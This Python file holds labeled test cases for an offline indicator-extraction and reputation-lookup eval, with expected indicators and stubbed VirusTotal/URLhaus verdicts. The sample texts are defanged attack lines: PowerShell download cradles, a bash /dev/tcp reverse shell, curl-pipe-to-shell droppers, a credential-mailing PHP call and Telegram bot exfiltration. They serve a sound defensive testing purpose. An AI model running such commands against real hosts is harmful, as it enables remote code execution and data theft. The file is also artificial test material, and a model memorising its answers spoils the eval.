"""
Labeled cases for the offline enrichment eval (see eval_harness.py).

Each case is a small, self-contained scenario derived from the repo's synthetic
corpus families. It carries:

  - name:                a short id.
  - text:                sample text to run the pipeline over.
  - expected_indicators: the ground-truth indicators a human would pull out
                         (list of {"indicator", "type"}); measures extraction.
  - golden:              (optional) a compact per-source reputation label the eval
                         stubs each source to return -- "malicious", "clean", or
                         "not_found" -- so the fan-out is deterministic and offline.
                         URLhaus is a blocklist, so it only ever "malicious" (listed)
                         or "not_found" (absent); "clean" there is treated as absent.
  - expected_malicious:  (with golden) the expected sample-level consensus -- True if
                         ANY extracted indicator's consensus comes back malicious.

The golden label is the eval's *input*, not a claim about the sample: the corpus
is defanged (RFC 5737 / *.example), so real lookups return not_found. The eval
measures the pipeline (extract -> lookup -> normalize -> consensus), not live
detections -- so a phishing sample that abuses legitimate infrastructure
(api.telegram.org) is correctly *not* flagged by reputation alone.
"""

CASES = [
    {
        "name": "ps_download_cradle",
        "text": (
            "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1')\n"
            'Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://192.0.2.10/b.txt")'
        ),
        "expected_indicators": [
            {"indicator": "http://192.0.2.10/stage2.ps1", "type": "url"},
            {"indicator": "http://192.0.2.10/b.txt", "type": "url"},
        ],
        "golden": {"virustotal": "malicious", "urlhaus": "malicious"},
        "expected_malicious": True,
    },
    {
        "name": "reverse_shell_ip",
        "text": "bash -i >& /dev/tcp/192.0.2.44/4444 0>&1",
        "expected_indicators": [{"indicator": "192.0.2.44", "type": "ip_address"}],
        # URLhaus does not track bare C2 IPs like this -> not_found; VT flags it.
        "golden": {"virustotal": "malicious", "urlhaus": "not_found"},
        "expected_malicious": True,
    },
    {
        "name": "curl_pipe_dropper",
        "text": (
            "curl -s http://192.0.2.77/install.sh | bash\n"
            "nohup wget -qO- http://192.0.2.77/x | sh &"
        ),
        "expected_indicators": [
            {"indicator": "http://192.0.2.77/install.sh", "type": "url"},
            {"indicator": "http://192.0.2.77/x", "type": "url"},
        ],
        "golden": {"virustotal": "malicious", "urlhaus": "malicious"},
        "expected_malicious": True,
    },
    {
        "name": "urlhaus_only_flag",
        "text": "fetch payload from http://192.0.2.55/gate.php",
        "expected_indicators": [{"indicator": "http://192.0.2.55/gate.php", "type": "url"}],
        # VT has no data but URLhaus lists it -> one source flagging must drive malicious.
        "golden": {"virustotal": "not_found", "urlhaus": "malicious"},
        "expected_malicious": True,
    },
    {
        "name": "credential_exfil_email",
        "text": (
            'mail("collector@attacker.example", "creds", $body);\n'
            'header("Location: https://accounts.example.com/");'
        ),
        "expected_indicators": [
            {"indicator": "https://accounts.example.com/", "type": "url"},
            {"indicator": "attacker.example", "type": "domain"},
        ],
        # Defanged doc domains: no reputation source has data -> not malicious by reputation.
        "golden": {"virustotal": "not_found", "urlhaus": "not_found"},
        "expected_malicious": False,
    },
    {
        "name": "telegram_api_abuse",
        "text": (
            'fetch("https://api.telegram.org/bot123:AAFAKE/sendMessage?chat_id=9&text=login")'
        ),
        "expected_indicators": [
            {
                "indicator": "https://api.telegram.org/bot123:AAFAKE/sendMessage?chat_id=9&text=login",
                "type": "url",
            }
        ],
        # Legit infrastructure abused for exfil: reputation is clean, so the tool does
        # NOT flag it -- reputation complements the YARA pattern detection, not replaces it.
        "golden": {"virustotal": "clean", "urlhaus": "not_found"},
        "expected_malicious": False,
    },
    {
        "name": "benign_installer_pipe",
        "text": "curl -fsSL https://get.example.org/install.sh | sh",
        "expected_indicators": [{"indicator": "https://get.example.org/install.sh", "type": "url"}],
        "golden": {"virustotal": "clean", "urlhaus": "not_found"},
        "expected_malicious": False,
    },
    {
        "name": "dedup_repeated_url",
        "text": "curl http://192.0.2.77/x | bash\nwget http://192.0.2.77/x | sh",
        "expected_indicators": [{"indicator": "http://192.0.2.77/x", "type": "url"}],
        "golden": {"virustotal": "malicious", "urlhaus": "malicious"},
        "expected_malicious": True,
    },
    {
        "name": "no_network_indicators",
        "text": "h = d41d8cd98f00b204e9800998ecf8427e ; obj = System.Net.WebClient",
        "expected_indicators": [],
        # No indicators -> the fan-out has nothing to flag.
        "golden": {"virustotal": "malicious", "urlhaus": "malicious"},
        "expected_malicious": False,
    },
]
